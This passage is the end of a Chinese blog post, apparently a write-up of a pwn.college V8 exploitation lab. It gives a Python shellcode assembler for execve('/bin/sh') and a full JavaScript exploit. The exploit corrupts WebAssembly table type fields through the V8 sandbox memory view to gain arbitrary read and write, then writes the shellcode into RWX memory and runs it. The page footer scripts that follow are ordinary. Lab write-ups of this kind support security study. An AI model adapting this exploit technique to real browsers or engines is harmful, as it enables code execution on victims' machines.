class="built_in">len</span>(shellcode))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Assembly failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充对齐到8字节</span></span><br><span class="line">    padding = (<span class="number">8</span> - (<span class="built_in">len</span>(shellcode) % <span class="number">8</span>)) % <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> padding:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] padding <span class="subst">&#123;padding&#125;</span> byte(0x00)&quot;</span>)</span><br><span class="line">        shellcode += <span class="string">b&quot;\x00&quot;</span> * padding</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转换为64位十六进制数组</span></span><br><span class="line">    qwords = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">8</span>):</span><br><span class="line">        chunk = shellcode[i:i+<span class="number">8</span>]</span><br><span class="line">        <span class="comment"># 小端序转换并补齐8字节</span></span><br><span class="line">        qword = <span class="built_in">int</span>.from_bytes(chunk.ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>), <span class="string">&quot;little&quot;</span>)</span><br><span class="line">        qwords.append(<span class="string">f&quot;0x<span class="subst">&#123;qword:016x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;[<span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(qwords)&#125;</span>]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 在这里输入你的汇编代码</span></span><br><span class="line">    custom_asm = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        push rsi</span></span><br><span class="line"><span class="string">        mov rdi, 0x68732f6e69622f  /* /bin/sh */</span></span><br><span class="line"><span class="string">        push rdi</span></span><br><span class="line"><span class="string">        mov rdi, rsp  /* 获取字符串地址 */</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        mov rax, 0x3b  /* execve系统调用号 */</span></span><br><span class="line"><span class="string">        push 0x0</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成并打印结果</span></span><br><span class="line">    <span class="keyword">if</span> result := generate_64bit_shellcode(custom_asm):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nresult: &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<p><img src="/img/article/v8-heat/image-20250410104748206.png" alt="image-20250410104748206"></p>
+<h3 id="Expolit"><a href="#Expolit" class="headerlink" title="Expolit"></a>Expolit</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">d8.<span class="property">file</span>.<span class="title function_">execute</span>(<span class="string">&#x27;test/mjsunit/wasm/wasm-module-builder.js&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> builder = <span class="keyword">new</span> <span class="title class_">WasmModuleBuilder</span>();</span><br><span class="line">builder.<span class="title function_">exportMemoryAs</span>(<span class="string">&quot;mem0&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">let</span> $mem0 = builder.<span class="title function_">addMemory</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> kSig_i_ll   = <span class="title function_">makeSig</span>([kWasmI64, kWasmI64], [kWasmI32]);</span><br><span class="line"><span class="keyword">let</span> kSig_l_f    = <span class="title function_">makeSig</span>([kWasmFuncRef], [kWasmI64])</span><br><span class="line"><span class="keyword">let</span> $struct     = builder.<span class="title function_">addStruct</span>([<span class="title function_">makeField</span>(kWasmI64, <span class="literal">true</span>)]);</span><br><span class="line"><span class="keyword">let</span> $box        = builder.<span class="title function_">addStruct</span>([<span class="title function_">makeField</span>(kWasmFuncRef, <span class="literal">true</span>)]);</span><br><span class="line"><span class="keyword">let</span> $sig_i_ll   = builder.<span class="title function_">addType</span>(kSig_i_ll);</span><br><span class="line"><span class="keyword">let</span> $sig_l_l    = builder.<span class="title function_">addType</span>(kSig_l_l);</span><br><span class="line"><span class="keyword">let</span> $sig_0_sl   = builder.<span class="title function_">addType</span>(<span class="title function_">makeSig</span>([<span class="title function_">wasmRefType</span>($struct), kWasmI64], []));</span><br><span class="line"><span class="keyword">let</span> $sig_l_s    = builder.<span class="title function_">addType</span>(<span class="title function_">makeSig</span>([<span class="title function_">wasmRefType</span>($struct)], [kWasmI64]));</span><br><span class="line"><span class="keyword">let</span> $sig_0_ll   = builder.<span class="title function_">addType</span>(<span class="title function_">makeSig</span>([kWasmI64, kWasmI64], []));</span><br><span class="line"><span class="keyword">let</span> $sig_l_0    = builder.<span class="title function_">addType</span>(<span class="title function_">makeSig</span>([], [kWasmI64]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> $func0 = builder.<span class="title function_">addFunction</span>(<span class="string">&quot;func0&quot;</span>, $sig_0_sl)</span><br><span class="line">    .<span class="title function_">exportFunc</span>()</span><br><span class="line">    .<span class="title function_">addBody</span>([</span><br><span class="line">        kExprLocalGet, <span class="number">0</span>, <span class="comment">//获取第一个参数</span></span><br><span class="line">        kExprLocalGet, <span class="number">1</span>, <span class="comment">//获取第二个参数</span></span><br><span class="line">        kGCPrefix, kExprStructSet, $struct, <span class="number">0</span>,</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">let</span> $func1 = builder.<span class="title function_">addFunction</span>(<span class="string">&quot;func1&quot;</span>, $sig_l_s)</span><br><span class="line">    .<span class="title function_">exportFunc</span>()</span><br><span class="line">    .<span class="title function_">addBody</span>([</span><br><span class="line">        kExprLocalGet, <span class="number">0</span>,</span><br><span class="line">        kGCPrefix, kExprStructGet, $struct, <span class="number">0</span>,</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">let</span> $func2 = builder.<span class="title function_">addFunction</span>(<span class="string">&quot;func2&quot;</span>, $sig_l_l)</span><br><span class="line">    .<span class="title function_">exportFunc</span>()</span><br><span class="line">    .<span class="title function_">addBody</span>([</span><br><span class="line">        kExprLocalGet, <span class="number">0</span>,</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">let</span> $func_i_ll = builder.<span class="title function_">addFunction</span>(<span class="string">&quot;func_i_ll&quot;</span>, $sig_i_ll)</span><br><span class="line">    .<span class="title function_">exportFunc</span>()</span><br><span class="line">    .<span class="title function_">addBody</span>([</span><br><span class="line">        kExprI32Const, <span class="number">0</span>, <span class="comment">//返回0</span></span><br><span class="line">]);</span><br><span class="line"><span class="keyword">let</span> $func_l_l = builder.<span class="title function_">addFunction</span>(<span class="string">&quot;func_l_l&quot;</span>, $sig_l_l)</span><br><span class="line">    .<span class="title function_">exportFunc</span>()</span><br><span class="line">    .<span class="title function_">addBody</span>([</span><br><span class="line">        kExprI64Const, <span class="number">0</span>, <span class="comment">//返回0</span></span><br><span class="line">]);</span><br><span class="line"><span class="keyword">let</span> $func_l_0 = builder.<span class="title function_">addFunction</span>(<span class="string">&quot;func_l_0&quot;</span>, $sig_l_0)</span><br><span class="line">    .<span class="title function_">exportFunc</span>()</span><br><span class="line">    .<span class="title function_">addBody</span>([</span><br><span class="line">        kExprI64Const, <span class="number">0</span>, <span class="comment">//返回0</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> $t0 = builder.<span class="title function_">addTable</span>(<span class="title function_">wasmRefType</span>($sig_i_ll), <span class="number">1</span>, <span class="number">1</span>, [kExprRefFunc, $func_i_ll.<span class="property">index</span>]);</span><br><span class="line">builder.<span class="title function_">addExportOfKind</span>(<span class="string">&quot;table0&quot;</span>, kExternalTable, $t0.<span class="property">index</span>);<span class="comment">//导出表格</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> $t1 = builder.<span class="title function_">addTable</span>(<span class="title function_">wasmRefType</span>($sig_l_l), <span class="number">1</span>, <span class="number">1</span>, [kExprRefFunc, $func_l_l.<span class="property">index</span>]);</span><br><span class="line">builder.<span class="title function_">addExportOfKind</span>(<span class="string">&quot;table1&quot;</span>, kExternalTable, $t1.<span class="property">index</span>);<span class="comment">//导出表格</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> $t2 = builder.<span class="title function_">addTable</span>(<span class="title function_">wasmRefType</span>($sig_l_0), <span class="number">1</span>, <span class="number">1</span>, [kExprRefFunc, $func_l_0.<span class="property">index</span>]);</span><br><span class="line">builder.<span class="title function_">addExportOfKind</span>(<span class="string">&quot;table2&quot;</span>, kExternalTable, $t2.<span class="property">index</span>);<span class="comment">//导出表格</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> $test_table = builder.<span class="title function_">addTable</span>(<span class="title function_">wasmRefType</span>($sig_l_l), <span class="number">1</span>, <span class="number">1</span>, [kExprRefFunc, $func2.<span class="property">index</span>]);</span><br><span class="line">builder.<span class="title function_">addExportOfKind</span>(<span class="string">&quot;test_table&quot;</span>, kExternalTable, $test_table.<span class="property">index</span>);<span class="comment">//导出表格</span></span><br><span class="line"></span><br><span class="line">builder.<span class="title function_">addFunction</span>(<span class="string">&quot;aaw&quot;</span>, kSig_i_ll)</span><br><span class="line">    .<span class="title function_">exportFunc</span>()</span><br><span class="line">    .<span class="title function_">addBody</span>([</span><br><span class="line">        kExprLocalGet, <span class="number">1</span>,</span><br><span class="line">        kExprLocalGet, <span class="number">0</span>,  <span class="comment">// func parameter</span></span><br><span class="line">        kExprI32Const, <span class="number">0</span>,  <span class="comment">// func index</span></span><br><span class="line">        kExprCallIndirect, $sig_i_ll, <span class="number">0</span> <span class="comment">/* table num */</span>,</span><br><span class="line">]);</span><br><span class="line">builder.<span class="title function_">addFunction</span>(<span class="string">&quot;aar&quot;</span>, kSig_l_l)</span><br><span class="line">    .<span class="title function_">exportFunc</span>()</span><br><span class="line">    .<span class="title function_">addBody</span>([</span><br><span class="line">        kExprLocalGet, <span class="number">0</span>,  <span class="comment">// func parameter</span></span><br><span class="line">        kExprI32Const, <span class="number">0</span>,  <span class="comment">// func index</span></span><br><span class="line">        kExprCallIndirect, $sig_l_l, <span class="number">1</span> <span class="comment">/* table num */</span>,</span><br><span class="line">]);</span><br><span class="line">builder.<span class="title function_">addFunction</span>(<span class="string">&quot;leak&quot;</span>, kSig_l_v)</span><br><span class="line">    .<span class="title function_">exportFunc</span>()</span><br><span class="line">    .<span class="title function_">addBody</span>([</span><br><span class="line">        kExprI32Const, <span class="number">0</span>,  <span class="comment">// func index</span></span><br><span class="line">        kExprCallIndirect, $sig_l_0, <span class="number">2</span> <span class="comment">/* table num */</span>,</span><br><span class="line">]);</span><br><span class="line">builder.<span class="title function_">addFunction</span>(<span class="string">&quot;boom&quot;</span>, $sig_l_l)</span><br><span class="line">    .<span class="title function_">exportFunc</span>()</span><br><span class="line">    .<span class="title function_">addBody</span>([</span><br><span class="line">        kExprI64Const, <span class="number">0</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> instance = builder.<span class="title function_">instantiate</span>();<span class="comment">//实例化模型</span></span><br><span class="line"><span class="keyword">let</span> func0 = instance.<span class="property">exports</span>.<span class="property">func0</span>;</span><br><span class="line"><span class="keyword">let</span> func1 = instance.<span class="property">exports</span>.<span class="property">func1</span>;</span><br><span class="line"><span class="keyword">let</span> func2 = instance.<span class="property">exports</span>.<span class="property">func2</span>;</span><br><span class="line"><span class="keyword">let</span> table0 = instance.<span class="property">exports</span>.<span class="property">table0</span>;</span><br><span class="line"><span class="keyword">let</span> table1 = instance.<span class="property">exports</span>.<span class="property">table1</span>;</span><br><span class="line"><span class="keyword">let</span> table2 = instance.<span class="property">exports</span>.<span class="property">table2</span>;</span><br><span class="line"><span class="keyword">let</span> test_table = instance.<span class="property">exports</span>.<span class="property">test_table</span>;</span><br><span class="line"><span class="keyword">let</span> boom = instance.<span class="property">exports</span>.<span class="property">boom</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> kHeapObjectTag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> kStructField0Offset = <span class="number">8</span>;  <span class="comment">// 0:map, 4:hash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> memory = <span class="keyword">new</span> <span class="title class_">DataView</span>(<span class="keyword">new</span> <span class="title class_">Sandbox</span>.<span class="title class_">MemoryView</span>(<span class="number">0</span>, <span class="number">0x100000000</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getAddressOf_sbx</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Sandbox</span>.<span class="title function_">getAddressOf</span>(obj) + kHeapObjectTag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getUint32_sbx</span>(<span class="params">obj, offset</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> memory.<span class="title function_">getUint32</span>(obj + offset - kHeapObjectTag, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setUint32_sbx</span>(<span class="params">obj, offset, value</span>)&#123;</span><br><span class="line">    memory.<span class="title function_">setUint32</span>(obj + offset - kHeapObjectTag, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Corrupt the table&#x27;s type to accept putting $func0 into it.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> t0 = <span class="title function_">getAddressOf_sbx</span>(table0);</span><br><span class="line"><span class="keyword">let</span> t1 = <span class="title function_">getAddressOf_sbx</span>(table1);</span><br><span class="line"><span class="keyword">let</span> t2 = <span class="title function_">getAddressOf_sbx</span>(table2);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过调试查看test table的raw_type段内容获取，如下：</span></span><br><span class="line"><span class="comment"> * let $test_table = builder.addTable(wasmRefType($sig_func), 1, 1, [kExprRefFunc, $func.index]);</span></span><br><span class="line"><span class="comment"> * builder.addExportOfKind(&quot;test_table&quot;, kExternalTable, $test_table.index);//导出表格</span></span><br><span class="line"><span class="comment"> * %DebugPrint($test_table);</span></span><br><span class="line"><span class="comment"> * 其中$sig_func是函数的签名</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 或者有如下type计算公式：</span></span><br><span class="line"><span class="comment"> *  const kRef = 9;</span></span><br><span class="line"><span class="comment"> *  const kSmiTagSize = 1;</span></span><br><span class="line"><span class="comment"> *  const kHeapTypeShift = 5;、</span></span><br><span class="line"><span class="comment"> *  let type = (($sig_func &lt;&lt; kHeapTypeShift) | kRef) &lt;&lt; kSmiTagSize;</span></span><br><span class="line"><span class="comment"> *  其中$sig_aaw是对应函数的签名</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> kWasmTableObjectTypeOffset = <span class="number">32</span>; <span class="comment">//debug调试即可得到</span></span><br><span class="line"><span class="keyword">let</span> type0 = <span class="number">137</span>*<span class="number">2</span>;</span><br><span class="line"><span class="keyword">let</span> type1 = <span class="number">169</span>*<span class="number">2</span>;</span><br><span class="line"><span class="keyword">let</span> type2 = <span class="number">105</span>*<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setUint32_sbx</span>(t0, kWasmTableObjectTypeOffset, type0);</span><br><span class="line">table0.<span class="title function_">set</span>(<span class="number">0</span>, func0); <span class="comment">//将func0放入table0中</span></span><br><span class="line"><span class="title function_">setUint32_sbx</span>(t1, kWasmTableObjectTypeOffset, type1);</span><br><span class="line">table1.<span class="title function_">set</span>(<span class="number">0</span>, func1); <span class="comment">//将func1放入table1中</span></span><br><span class="line"><span class="title function_">setUint32_sbx</span>(t2, kWasmTableObjectTypeOffset, type2);</span><br><span class="line">table2.<span class="title function_">set</span>(<span class="number">0</span>, func2); <span class="comment">//将func2放入table2中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> anyAddrWrite = instance.<span class="property">exports</span>.<span class="property">aaw</span>;</span><br><span class="line"><span class="keyword">let</span> anyAddrRead = instance.<span class="property">exports</span>.<span class="property">aar</span>;</span><br><span class="line"><span class="keyword">let</span> leakAddr = instance.<span class="property">exports</span>.<span class="property">leak</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> something = <span class="title function_">leakAddr</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] leakAddr --&gt; 0x&quot;</span>+<span class="title function_">hex</span>(something));</span><br><span class="line"><span class="keyword">let</span> rwx_part1 = <span class="title function_">anyAddrRead</span>(something + <span class="number">0x20n</span>) - <span class="number">0xan</span>; <span class="comment">// -0xa由debug获取</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] rwx_part1 --&gt; 0x&quot;</span>+<span class="title function_">hex</span>(rwx_part1));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> target = rwx_part1 + <span class="number">0xe00n</span> +<span class="number">1n</span>; </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] target --&gt; 0x&quot;</span>+<span class="title function_">hex</span>(target));</span><br><span class="line"></span><br><span class="line"><span class="title function_">anyAddrWrite</span>(target, <span class="number">0x622fbf4856f63148n</span>);</span><br><span class="line"><span class="title function_">anyAddrWrite</span>(target+<span class="number">0x8n</span>, <span class="number">0x48570068732f6e69n</span>);</span><br><span class="line"><span class="title function_">anyAddrWrite</span>(target+<span class="number">0x10n</span>, <span class="number">0xc0c748d23148e789n</span>);</span><br><span class="line"><span class="title function_">anyAddrWrite</span>(target+<span class="number">0x18n</span>, <span class="number">0x050f006a0000003bn</span>);</span><br><span class="line"><span class="title function_">anyAddrWrite</span>(target+<span class="number">0x30n</span>, <span class="number">0x0000000000050f00n</span>);</span><br><span class="line"><span class="title function_">anyAddrWrite</span>(rwx_part1+<span class="number">0x2dn</span>-<span class="number">8n</span>+<span class="number">1n</span>, <span class="number">0xdd6e9n</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">boom</span>(<span class="number">0x1n</span>);</span><br></pre></td></tr></table></figure>
+
+
+</div> 
+
+<script>
+    window.onload = detectors();
+</script>
+    <div class="post-footer">
+    <div class="h-line-primary"></div>
+    <nav class="post-nav">
+        <div class="prev-item">
+           
+        </div>
+        <div class="next-item">
+            
+                <div class="icon arrow-right"></div>
+                <div class="post-link">
+                  <a href="/2024/12/24/%E3%80%90V8%E3%80%91pwncollege%20V8%20Exploitation%20WP%E4%B8%8B/">Next</a>  
+                </div>  
+            
+        </div>
+    </nav>
+</div>
+
+    
+      <div class="post-comment">
+
+    
+        <div id="vcomments"></div>
+        <script>
+            var META = ['nick', 'mail', 'link'];
+            var meta = 'nick,mail';
+            meta = meta.split(',').filter(item => {
+                return META.includes(item);
+            });
+            new Valine({
+                el: '#vcomments',
+                appId: 'rb5WOYmmPvNLWkXLJIiqi1p0-gzGzoHsz',
+                appKey: 'B0j55vucTVteHiiUJeIL8Vx8',
+                lang: 'zh-CN',
+                placeholder: '这里是评论区:)',
+                avatar: 'mp',
+                meta: meta
+            })
+        </script>    
+     
+
+     
+    
+    
+
+</div>
+     
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+    
+      <div class="search-popup">
+    <div class="search-popup-overlay">  
+    </div>
+    <div class="search-popup-window" >
+        <div class="search-header">
+            <div class="search-input-container">
+              <input autocomplete="off" autocapitalize="off" maxlength="80"
+                     placeholder="Search Anything" spellcheck="false"
+                     type="search" class="search-input">
+            </div>
+            <div class="search-close-btn">
+                <div class="icon close-btn"></div>
+            </div>
+        </div>
+        <div class="search-result-container">
+        </div>
+    </div>
+</div>
+
+<script>
+    const searchConfig = {
+        path             : "/search.xml",
+        top_n_per_article: "1",
+        unescape         : "false",
+        trigger: "auto",
+        preload: "false"
+    }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
+<script src="/js/search.js"></script>
+    
+    
+
+  <!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?Loora1N";
+            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
+            var git_user ="Loora1N";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/about/'){
+                console.log('已挂载github calendar')
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style></style><!-- hexo injector body_end end --></body>
+</html>
